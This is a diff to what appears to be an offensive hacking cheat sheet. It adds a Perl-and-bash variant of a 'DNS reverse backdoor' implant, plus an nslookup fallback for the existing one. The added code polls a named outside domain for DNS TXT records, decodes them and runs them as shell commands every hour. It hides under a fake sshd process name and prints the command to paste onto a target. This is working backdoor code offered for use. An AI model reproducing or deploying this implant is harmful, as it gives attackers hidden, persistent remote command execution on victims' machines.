@@ -1878,6 +1878,9 @@ An elaborate DNS reverse backdoor (as a daemon and living-off-the-land):
 1. Generate a 1-line implant:
 
 ```shell
+# If dig does not exists then replace /dig +short.../ with
+# /nslookup -q=txt '"$D"'|grep -Fm1 "text ="|sed -E "s|.*text = (.*)|\1|g;s|[\" ]||g"|base64 -d
+# or use the Perl example below.
 base64 -w0 >x.txt <<-'EOF'
 D=b00m2.team-teso.net
 P="sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups"
@@ -1911,6 +1914,19 @@ ExecStartPre=/usr/sbin/sshd -t
 ExecStart=/usr/sbin/sshd -D $SSHD_OPTS
 ...
 ```
+
+The same but only needing perl + bash (not dig):
+```shell
+perl -MMIME::Base64 -e '$/=undef;print encode_base64(<>,"")' >x.txt <<-'EOF'
+D=b00m2.team-teso.net
+P="sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups"
+M=/dev/shm/.cache-1-${UID}
+(echo 'use Net::DNS;use MIME::Base64;exit(0) if -e "'"$M"'";close(open($f,">","'"$M"'"));for (;;) { system decode_base64((Net::DNS::Resolver->new->query(q/'"$D"'/,q/TXT/)->answer)[0]->txtdata=~y/ \\//dr);sleep(3600)}'|exec -a "$P" perl &) &>/dev/null
+EOF
+echo "===> Execute the following on the target:"$'\n\033[0;36m'"perl -MMIME::Base64 -e'print decode_base64(\"$(<x.txt)\")'|bash"$'\033[0m'
+rm -f x.txt
+```
+(thank you to LouCipher for a perl verison)
    
 <a id="ld-backdoor"></a>
 **6.vii. Local Root Backdoor**
